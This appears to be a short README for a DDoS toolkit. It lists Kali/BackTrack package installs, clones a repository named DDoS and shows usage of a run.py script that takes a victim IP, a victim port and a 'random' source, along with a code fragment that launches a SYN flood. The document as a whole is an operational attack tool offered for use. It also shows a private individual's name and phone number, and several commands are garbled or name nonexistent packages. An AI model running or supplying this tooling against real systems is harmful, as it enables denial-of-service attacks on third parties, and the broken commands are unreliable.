Jayesh Patel
Toronto ON 
647-271-9971


prerequisites :


Step 1 : Install Ubuntu / Kali / BackTrack Linux :

apt-get install nikto

apt-get install sushi

apt-get install ssh

apt-get install tcpdump graphviz imagemagick python-gnuplot

sudo apt-get install slowhttptest

apt-get install subversion

apt-get install aclocal

apt-get install automaker

pip install scapy 

pip install iptools

pip install ipaddress

pip install ipaddr

pip install pinject

Git clone …… "https://github.com/umasolution/DDoS.git"

Run Command :
root@bt:~/dos# python run.py -h

usage: run.py [-h] c_num victim_ip victim_port source_ip source_port

Pass Arguments

positional arguments:

c_num        Enter Number of request

victim_ip    Enter Victim IP

victim_port  Enter Victim Port

source_ip    Enter Source IP

source_port  Enter Source Port 


python run.py 10 192.168.10.1 100 random 80

ls

run.py (main file)

scapy_dos.py (scapy file where we mentioned all attack)

slowhttptest (Tools for DoS)

tool_dos.py (Tools feel where we mentioned all tools based attack)





Find the following code for perform syn attack 

from scapy_dos import Dos_Attack

from tool_dos import Dos_Tools 

res = Dos_Attack(sip, dip)

we need run run SYN Attack, call function SYN_ATT from scapy_dos.py file with two argument

def SYN_ATT(self, sport, dport):

res.SYN_ATT(sport, dport)       



